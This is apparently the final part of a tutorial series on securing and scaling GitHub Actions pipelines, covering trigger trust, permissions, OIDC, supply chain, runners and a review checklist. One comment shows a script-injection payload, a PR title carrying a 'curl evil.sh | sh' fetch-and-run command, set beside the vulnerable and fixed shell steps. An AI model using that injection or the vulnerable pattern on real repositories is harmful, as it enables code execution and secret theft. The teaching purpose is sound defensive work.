This is part three of three. It closes the series by taking **every topic from Beginner and Mid one level further** — each one now has a security, scale, or ownership dimension — and adds the work you own when CI/CD is your responsibility rather than your tool.

## Where this picks up

| Topic from earlier levels | What this level adds |
|---|---|
| Triggers | The **trust model**: which triggers hand fork-influenced code a privileged token |
| Expressions | **Script injection** — why event data must never reach a shell |
| Secrets and `GITHUB_TOKEN` | Least-privilege `permissions`, GitHub App tokens, and OIDC instead of stored keys |
| Caching | Container layer caching with Buildx, and **cache poisoning** |
| Actions you consume | Actions you **author**, and supply-chain controls on the ones you use |
| Reusable workflows | Running them as a **versioned platform** across sixty repositories |
| Runners | Self-hosted strategy, ephemerality, isolation, and the cost model |
| Environments | Their role as an identity boundary, not just an approval gate |
| Matrix and artifacts | Provenance, attestations, and immutable deploy references |
| Debugging | Fleet observability metrics and incident playbooks |
| — **new** — | Container builds · custom actions · ML delivery · migration · review checklist |

## The trust model

Every workflow run has three properties that together determine your exposure: **whose code executes**, **whether secrets are present**, and **what the token can do**. Most real GitHub Actions vulnerabilities are those three lining up badly.

| Trigger | Executes code from | Secrets | Token |
|---|---|---|---|
| `push` | Your repository | Yes | As configured |
| `pull_request`, same-repo branch | Your repository | Yes | As configured |
| `pull_request` from a **fork** | The fork | **No** | Read-only |
| `pull_request_target` | The **base** repository | **Yes** | Write-capable |
| `workflow_run` | The base repository | Yes | Write-capable |
| `issue_comment` | The base repository | Yes | Write-capable |

Read that until the pattern is obvious: GitHub deliberately makes fork pull requests harmless by withholding secrets and downgrading the token. The dangerous triggers are exactly the ones that undo that protection because a maintainer needed to label a PR or post a comment.

<div class="callout warn">
  <span class="ct">The single most dangerous pattern in GitHub Actions</span>
  <code>pull_request_target</code> combined with checking out <code>github.event.pull_request.head.sha</code>. That executes <b>untrusted fork code</b> in a job that <b>holds your secrets and a writable token</b>. Any build script, test fixture, or lifecycle hook in the fork can print every secret you own. It is not theoretical — it is how numerous real repositories have been compromised.
</div>

Two safe shapes:

```yaml
# Safe: reads metadata from the event, never runs fork code
on: pull_request_target
permissions:
  pull-requests: write
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/labeler@v5      # no checkout of head.sha anywhere
```

```yaml
# Safe: split privilege. Unprivileged job builds; privileged job publishes.
# 1) .github/workflows/pr-build.yml — no secrets, fork code runs here
on: pull_request
permissions: { contents: read }
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v4
        with: { name: preview, path: dist/ }

# 2) .github/workflows/pr-publish.yml — has secrets, never runs fork code
on:
  workflow_run:
    workflows: ['pr-build']
    types: [completed]
permissions: { contents: read, pull-requests: write }
jobs:
  publish:
    if: github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: preview
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ secrets.GITHUB_TOKEN }}
      - run: ./upload-preview.sh      # consumes the artifact, never executes it
```

## Script injection

You have used expressions since Beginner. At this level the concern flips: event data is **attacker-controlled text**, and interpolating it into a shell is interpolating it into source code.

```yaml
# Vulnerable. A PR titled  "; curl evil.sh | sh ;  executes on your runner.
- run: echo "Title: ${{ github.event.pull_request.title }}"

# Safe. The value arrives as data through the environment, never as shell source.
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $TITLE"
```

The rule is absolute and easy to apply: **`${{ github.event.* }}` never appears inside a `run` body.** Branch names, issue titles, comment bodies, commit messages, and author names are all attacker-controlled.

The same applies to `actions/github-script` and to any action input you build from event data:

```yaml
# Vulnerable — the payload is spliced into JavaScript source
- uses: actions/github-script@v7
  with:
    script: console.log("${{ github.event.issue.title }}")

# Safe — read it from the environment at runtime
- uses: actions/github-script@v7
  env:
    TITLE: ${{ github.event.issue.title }}
  with:
    script: console.log(process.env.TITLE)
```

## Permissions: least privilege

Mid mentioned `permissions` in passing. Here is the whole mechanism.

```yaml
permissions:
  contents: read              # a read-only floor for the entire workflow

jobs:
  release:
    permissions:
      contents: write         # widened for exactly one job
      packages: write
      id-token: write         # required for OIDC
    runs-on: ubuntu-latest
```

The mechanic that makes this powerful: **declaring any scope sets every undeclared scope to `none`.** A single `contents: read` line at the top removes the token's ability to push, tag, comment, or publish — and you then grant back only what a specific job needs.

| Scope | Grants |
|---|---|
| `contents` | Read/write repository code, tags, releases |
| `pull-requests` | Comment on, label, and modify PRs |
| `issues` | Same for issues |
| `packages` | Push to GitHub Packages / GHCR |
| `id-token` | Request an OIDC token — **required** for cloud federation |
| `actions` | Manage workflow runs and artifacts |
| `attestations` | Write build provenance |

Set the **organisation default** to read-only contents and make workflows opt in. That one setting makes every new repository safe by default rather than dependent on each author remembering.

Two limits drive real architecture:

**A reusable workflow receives the caller's token**, so its `permissions` can never exceed the caller's. Declaring them in the callee documents the contract and fails loudly when a caller is too restrictive.

**`GITHUB_TOKEN` cannot reach another repository.** Cross-repository automation needs a GitHub App installation token or a fine-grained PAT — and prefer the App. A PAT carries a human's full access, does not expire with the job, and appears in the audit trail as that person rather than as automation.

```yaml
- uses: actions/create-github-app-token@v1
  id: app-token
  with:
    app-id: ${{ vars.APP_ID }}
    private-key: ${{ secrets.APP_PRIVATE_KEY }}
    repositories: other-repo

- env:
    GH_TOKEN: ${{ steps.app-token.outputs.token }}   # scoped, short-lived
  run: gh release create v1.0.0 --repo my-org/other-repo
```

## OIDC: deployment without stored credentials

Beginner and Mid stored cloud keys as secrets. At this level you remove them entirely — the runner requests a short-lived signed token, and the cloud exchanges it for temporary credentials.

```yaml
permissions:
  id-token: write             # allow the job to request an identity token
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.DEPLOY_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
      - run: aws sts get-caller-identity     # prove the identity before deploying
```

<div class="guide-timeline">
  <div class="guide-timeline-item"><span>1</span><strong>The job requests a token</strong><small>GitHub signs a short-lived JWT whose claims describe the repository, ref, environment, and workflow.</small></div>
  <div class="guide-timeline-item"><span>2</span><strong>The cloud verifies the signature</strong><small>GitHub's OIDC provider is registered once as a trusted identity provider in the account.</small></div>
  <div class="guide-timeline-item"><span>3</span><strong>The trust policy inspects the claims</strong><small>This is the part that actually matters, and the part that is usually wrong.</small></div>
  <div class="guide-timeline-item"><span>4</span><strong>Temporary credentials are issued</strong><small>Valid for the job and then gone. Nothing to rotate, nothing to leak from a log.</small></div>
</div>

<div class="callout warn">
  <span class="ct">Where OIDC is almost always misconfigured</span>
  A trust policy matching <code>repo:my-org/*:*</code> means <b>any branch of any repository in the organisation</b> can assume that role — including a branch an attacker opens a pull request from. Constrain the <code>sub</code> claim: <code>repo:my-org/my-repo:ref:refs/heads/main</code>, or better <code>repo:my-org/my-repo:environment:production</code>, which makes the environment's approval gate part of the identity itself.
</div>

Verify the constraint rather than trusting it. Open a pull request from a throwaway branch with a workflow that tries to assume the role. It should be refused. If it succeeds, your condition is too broad and the approval gate is decorative.

## Supply chain

A `uses:` line is a decision to execute somebody else's code in a job that may hold your credentials. Mid taught you to pin tags; here is the full control set.

| Control | Removes |
|---|---|
| Pin third-party actions to a full commit SHA | A moving tag being repointed at malicious code |
| Dependabot on `github-actions` | Those pins going stale and unpatched |
| Organisation policy allowing only selected actions | An unvetted action entering through any repository |
| Vendor critical actions into your own organisation | Dependence on an account you do not control |
| `permissions: contents: read` by default | A compromised step's ability to push |
| Environment protection on deploy jobs | Any automated path to production without review |
| Artifact attestations | Being unable to prove which workflow built an artifact |

```yaml
# The pin, with the human-readable version in a trailing comment
- uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3  # v3.5.0
```

```yaml .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
    groups:
      actions:
        patterns: ['*']       # one pull request a week instead of fifteen
```

Pinning without updating is its own failure — a frozen action is an unpatched one. The two controls only work together.

Two less obvious surfaces worth raising unprompted:

**Caches are a write surface.** A pull request branch can poison a cache that a later `main` run restores. Never restore something and then execute it without verification — which is why you cache dependency *downloads* rather than installed, executable trees.

**Self-hosted runners on public repositories are dangerous**, because any fork pull request can execute code on a machine that persists between jobs.

## Container builds and layer caching

Mid cached dependencies. Container builds need a different cache entirely, and it is usually the slowest job in a pipeline.

```yaml
permissions:
  contents: read
  packages: write
  attestations: write
  id-token: write

steps:
  - uses: actions/checkout@v4
  - uses: docker/setup-buildx-action@v3

  - uses: docker/login-action@v3
    with:
      registry: ghcr.io
      username: ${{ github.actor }}
      password: ${{ secrets.GITHUB_TOKEN }}

  - id: push
    uses: docker/build-push-action@v6
    with:
      push: ${{ github.event_name != 'pull_request' }}
      tags: |
        ghcr.io/${{ github.repository }}:sha-${{ github.sha }}
        ghcr.io/${{ github.repository }}:latest
      cache-from: type=gha
      cache-to: type=gha,mode=max
      provenance: true
      sbom: true

  - uses: actions/attest-build-provenance@v1
    with:
      subject-name: ghcr.io/${{ github.repository }}
      subject-digest: ${{ steps.push.outputs.digest }}
      push-to-registry: true
```

| Decision | Why |
|---|---|
| Buildx | BuildKit gives a real layer cache, multi-platform builds, and exportable cache backends |
| `type=gha` | Right for one repository; a **registry** cache when many repos or self-hosted runners share layers |
| `mode=max` | Exports intermediate layers too — dramatically better hit rate on multi-stage builds |
| `push:` false on PRs | A fork must never be able to publish to your registry |
| `:sha-…` tag | Immutable and traceable; `:latest` is for humans, never a deploy reference |
| `provenance` + attestation | Proves which workflow and commit produced the image |

`linux/arm64` under emulation is several times slower than native. For anything on the critical path, build each architecture on its own native runner and merge the manifests.

## Authoring your own actions

You have consumed actions since Beginner and written composite actions in Mid. When a capability belongs to many repositories, publish it properly.

| Type | Runs as | Reach for it when | Watch out for |
|---|---|---|---|
| Composite | Steps inside the caller's job | Packaging a repeated step sequence | `shell:` required on every `run` |
| JavaScript | Node on the runner | Real logic, API calls, cross-platform | The bundled `dist/` must be committed |
| Docker container | A container on the runner | An arbitrary toolchain, any language | Linux runners only; image pull cost per job |

```yaml action.yml
name: Deploy to our platform
description: Resolves the target environment and triggers a deployment
inputs:
  environment:
    description: Target environment name
    required: true
  wait:
    description: Block until the deployment settles
    default: 'true'
outputs:
  url:
    description: Public URL of the deployment
runs:
  using: node20
  main: dist/index.js
  post: dist/cleanup.js       # runs even if the job fails — good for teardown
branding:
  icon: upload-cloud
  color: blue
```

```javascript src/index.js
const core = require('@actions/core')
const github = require('@actions/github')

async function run() {
  try {
    const environment = core.getInput('environment', { required: true })
    const wait = core.getBooleanInput('wait')

    core.info(`Deploying to ${environment}`)
    core.setSecret(process.env.DEPLOY_TOKEN)     // mask it in logs

    const url = await deploy(environment, { wait })
    core.setOutput('url', url)
    await core.summary.addHeading('Deployed').addLink(url, url).write()
  } catch (error) {
    core.setFailed(error.message)
  }
}
run()
```

JavaScript actions start fastest and behave identically on all three operating systems, but dependencies are not installed for you — bundle with `@vercel/ncc` and commit the output. Docker actions are the most flexible and the slowest. Composite actions cannot define jobs, matrices, or their own runner; when you need those, you need a reusable workflow.

Version a published action the way the ecosystem expects: release `v1.2.3` and keep a mutable `v1` tag pointing at the newest compatible release.

## Reusable workflows as a platform

Mid showed the mechanism. At this level you are running it as a product for other teams.

<ol class="guide-steps">
  <li><b>One repository owns the standard</b>An organisation <code>.github</code> repository holding reusable workflows and composite actions, with CODEOWNERS on the workflow directory so changes are reviewed by the people who carry the pager.</li>
  <li><b>Version with a moving major tag</b>Consumers pin <code>@v2</code>. You release <code>v2.7.0</code> and move <code>v2</code>. A fix reaches sixty repositories without sixty pull requests, and a breaking change becomes <code>v3</code> with a migration note rather than a silent surprise.</li>
  <li><b>Canary before you move the tag</b>One low-risk repository pins the exact patch release. Green for a day, then move the major tag. Skip this and one bad release breaks every team simultaneously.</li>
  <li><b>Treat inputs as a public API</b>Types, defaults, descriptions. Removing an input is a breaking change even if one repository used it — and the failure lands on somebody else's pull request.</li>
  <li><b>Pass secrets explicitly</b><code>secrets: inherit</code> hands the callee everything the caller can see. Listing the two it needs documents the contract and bounds the damage from a bad release.</li>
  <li><b>Enforce with policy, not documentation</b>Organisation settings restricting which actions may run, required checks in branch protection, and required review on workflow files. A standard that depends on everyone remembering is not a standard.</li>
</ol>

<div class="callout warn">
  <span class="ct">The failure mode of a shared pipeline</span>
  A team needs one small change, cannot get it upstream quickly, and forks. Six months later there are eleven forks and no standard. The fix is not policy — it is <b>turnaround time</b> on upstream changes. If a reasonable request takes two weeks, forking is the rational choice and you will lose.
</div>

## Runners: strategy and cost

| Situation | Choice | Why |
|---|---|---|
| Public repository, ordinary CI | GitHub-hosted | Free minutes, fresh machine, no state to leak |
| Private repository, CPU-bound | Larger hosted runner | Same isolation model, more cores, no fleet to run |
| GPU, licensed tooling, VPC-only service | Self-hosted, **ephemeral** | The only options that reach the hardware or network |
| Public repository with fork PRs | **Never** self-hosted | Untrusted code plus persistent state |
| Many repositories, one custom image | Hosted runner with `container:` | The image is the standard; the runner stays disposable |

If you run self-hosted, the non-negotiables are: **ephemeral** — one job per runner, then destroy the VM or container; scoped to specific repositories rather than the whole organisation; in a network segment that cannot reach production directly; and never schedulable by a fork-triggered workflow.

On cost: Windows minutes bill at roughly twice Linux and macOS at roughly ten times. A matrix that includes macOS "for completeness" can quietly become most of your bill, and larger hosted runners are almost always cheaper than the engineering time to operate your own fleet.

## Observability

"CI is slow" is an opinion. Numbers make it a priority, and there are only four you need.

| Signal | Source |
|---|---|
| Median and p95 duration per workflow | The REST API for workflow runs |
| Failure rate, split into real failures and flakes | Run conclusions plus re-run counts |
| Queue time | Gap between run creation and job start |
| Cost by workflow and runner label | Actions usage metrics |

```yaml
# Pull the numbers into a scheduled report
- env:
    GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  run: |
    gh api -X GET '/repos/${{ github.repository }}/actions/runs' \
      -f per_page=100 --jq '
        [.workflow_runs[]
         | select(.conclusion != null)
         | { name, conclusion,
             mins: (((.updated_at|fromdate) - (.run_started_at|fromdate)) / 60) }]
        | group_by(.name)[]
        | { workflow: .[0].name,
            runs: length,
            failed: [.[] | select(.conclusion == "failure")] | length,
            p95: (sort_by(.mins) | .[(length * 0.95) | floor].mins) }' \
      | tee -a "$GITHUB_STEP_SUMMARY"
```

Be careful with debugging actions that open an interactive shell on a runner. They are genuinely useful and they are also a live session on a machine holding your secrets — restrict them to jobs that have none.

## Machine-learning delivery

If your pipelines build models rather than binaries, the shape changes. CI for software asks "does this work?"; CI for a model asks "is it good enough, and can I prove what produced it?"

<div class="guide-compare">
  <div class="guide-compare-col good">
    <h4>Carries over unchanged</h4>
    <ul>
      <li>Lint, type-check, unit tests on the training code</li>
      <li>Dependency caching, matrices, artifacts</li>
      <li>Environments and approvals for promotion</li>
      <li>OIDC for cloud access</li>
    </ul>
  </div>
  <div class="guide-compare-col bad">
    <h4>Genuinely new concerns</h4>
    <ul>
      <li>Data validation as a gate, not an afterthought</li>
      <li>Metric thresholds that fail the job rather than log a number</li>
      <li>Comparison against the currently deployed model</li>
      <li>Lineage: which commit, dataset version, and run produced this artifact</li>
      <li>GPU runners, long jobs, and the six-hour job ceiling</li>
    </ul>
  </div>
</div>

State the architectural answer explicitly, because it demonstrates judgement: **Actions is the orchestrator and the audit trail, not the compute.** It validates cheaply, submits work to a platform built for training, waits, gates on the returned metrics, and records the promotion. Proposing a six-hour GPU job on a hosted runner reads as inexperience.

```yaml .github/workflows/train.yml
name: Train and gate

on:
  workflow_dispatch:
    inputs:
      dataset:
        description: Dataset version to train on
        required: true
  schedule:
    - cron: '0 2 * * 1'

permissions:
  contents: read
  id-token: write

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.11', cache: pip }
      - run: pip install -r requirements.txt
      - name: Validate before spending money on GPUs
        run: python -m pipeline.validate --dataset "${{ inputs.dataset }}"

  train:
    needs: validate
    runs-on: ubuntu-latest
    timeout-minutes: 60
    outputs:
      run-id: ${{ steps.submit.outputs.run-id }}
    steps:
      - uses: actions/checkout@v4
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.TRAINING_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
      - id: submit
        name: Submit to the platform built for this, and wait
        run: python -m pipeline.submit --wait --dataset "${{ inputs.dataset }}"

  gate:
    needs: train
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Compare against what is deployed today
        run: |
          python -m pipeline.compare \
            --candidate "${{ needs.train.outputs.run-id }}" \
            --baseline production \
            --min-delta 0.0
      - name: Put the numbers where the reviewer will see them
        if: always()
        run: python -m pipeline.summary >> "$GITHUB_STEP_SUMMARY"

  promote:
    needs: gate
    runs-on: ubuntu-latest
    environment: model-production
    permissions: { id-token: write, contents: read }
    steps:
      - run: python -m pipeline.promote "${{ needs.train.outputs.run-id }}"
```

Four decisions there are the whole lesson. Validation runs on a cheap runner before an expensive one is provisioned. The gate is a **comparison against production**, not a hard-coded threshold, so it survives a changing dataset. Metrics go to the step summary so the approver does not download a zip. And promotion is a separate job behind an environment, which buys the approval, the scoped credentials, and a deployment record naming the commit and the run.

## Migrating from an existing CI system

You will be asked this. The answer that lands is a sequence, not a tool comparison.

<ol class="guide-steps">
  <li><b>Inventory the existing jobs</b>What triggers them, what credentials they hold, what network they reach, and which are required checks.</li>
  <li><b>Port the leaf jobs first</b>The ones nothing depends on. They prove the runner story, the network access, and the credential model with minimal risk.</li>
  <li><b>Run both systems in parallel</b>Actions non-blocking, so a gap in your port does not block anyone from merging.</li>
  <li><b>Move required checks one at a time</b>As each Actions job earns trust, switch branch protection to it and retire the old one.</li>
  <li><b>Decommission deliberately</b>Old CI kept "just in case" becomes an unpatched server with production credentials.</li>
</ol>

The important judgement: **do not port the old pipeline verbatim.** A great deal of Jenkinsfile logic exists to work around a persistent workspace and shared mutable state — problems Actions does not have. Reimplementing those workarounds imports complexity you no longer need.

## The review checklist

Most incidents are prevented at review time, not at runtime. This is the whole series compressed into what you look for in a workflow pull request.

| Check | Looking for |
|---|---|
| `on:` triggers | Any `pull_request_target`, `workflow_run`, or `issue_comment` — each gives fork-influenced runs a privileged token |
| Checkout ref | A `pull_request_target` job checking out `head.sha` — the classic exfiltration pattern |
| `permissions` | Present, minimal, widened per job rather than per workflow |
| Third-party `uses:` | SHA-pinned, from a recognisable source, covered by Dependabot |
| Interpolation | No `${{ github.event.* }}` inside a `run` body or a `github-script` block |
| Secrets | Never echoed, never in a job that runs untrusted code, environment-scoped where possible |
| `concurrency` | Present; cancelling on CI, **not** cancelling on deploys |
| `timeout-minutes` | Present on every job |
| Cache | Key hashes a lockfile; nothing executable is restored and then run unverified |
| Required checks | Job names unchanged, or branch protection updated in the same change |

<div class="callout note">
  <span class="ct">Make the checklist enforceable</span>
  CODEOWNERS on <code>.github/workflows/**</code> routes every workflow change to the team that owns CI. Combined with an organisation policy allowing only selected actions, the checklist stops depending on whoever happens to pick up the review.
</div>

## The complete picture

Here is the series' final pipeline — every level's topics, hardened.

```yaml .github/workflows/release.yml
name: Release

on:
  push:
    branches: [main]
    paths-ignore: ['docs/**', '**/*.md']

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false          # never cancel a release mid-flight

permissions:
  contents: read                     # read-only floor

jobs:
  test:
    uses: my-org/.github/.github/workflows/reusable-ci.yml@v2
    with:
      python-version: '3.12'
    secrets:
      CODECOV_TOKEN: ${{ secrets.CODECOV_TOKEN }}

  image:
    needs: test
    runs-on: ubuntu-latest
    timeout-minutes: 30
    permissions:
      contents: read
      packages: write
      attestations: write
      id-token: write
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false        # no push token left in the workspace

      - uses: docker/setup-buildx-action@v3
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - id: push
        uses: docker/build-push-action@v6
        with:
          push: true
          tags: ghcr.io/${{ github.repository }}:sha-${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          provenance: true
          sbom: true

      - uses: actions/attest-build-provenance@v1
        with:
          subject-name: ghcr.io/${{ github.repository }}
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true

  deploy:
    needs: image
    runs-on: ubuntu-latest
    environment:
      name: production                     # approval gate + scoped identity
      url: https://app.example.com
    concurrency:
      group: deploy-production
      cancel-in-progress: false
    permissions:
      id-token: write                      # OIDC — no stored cloud keys
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.DEPLOY_ROLE_ARN }}   # sub pinned to this env
          aws-region: ${{ vars.AWS_REGION }}

      - name: Deploy by immutable digest
        run: |
          ./deploy.sh --image "ghcr.io/${{ github.repository }}@${{ needs.image.outputs.digest }}"

      - name: Record the deployment
        if: always()
        run: |
          {
            echo "### Deployed"
            echo "- commit: \`${{ github.sha }}\`"
            echo "- digest: \`${{ needs.image.outputs.digest }}\`"
            echo "- by: @${{ github.actor }}"
          } >> "$GITHUB_STEP_SUMMARY"
```

## Where the series leaves you

Across the three levels you have gone from a first green run to owning CI/CD as a platform. The same topics carried all the way through, each time with more depth:

<div class="flow">
  <div class="node">BEGINNER<small>make it work</small></div>
  <span class="arrow">&rarr;</span>
  <div class="node">MID<small>make it fast and reusable</small></div>
  <span class="arrow">&rarr;</span>
  <div class="node">SENIOR<small>make it safe and scalable</small></div>
</div>

You should now be able to look at any workflow and see not just what it does but what it *permits*: which triggers give fork-influenced code a privileged token, what that token can reach, whether event data flows into a shell, whether third-party code is pinned, whether a credential could reach a log, and whether there is an automated path to production without a human in it.

That review instinct is the most valuable thing in this guide.
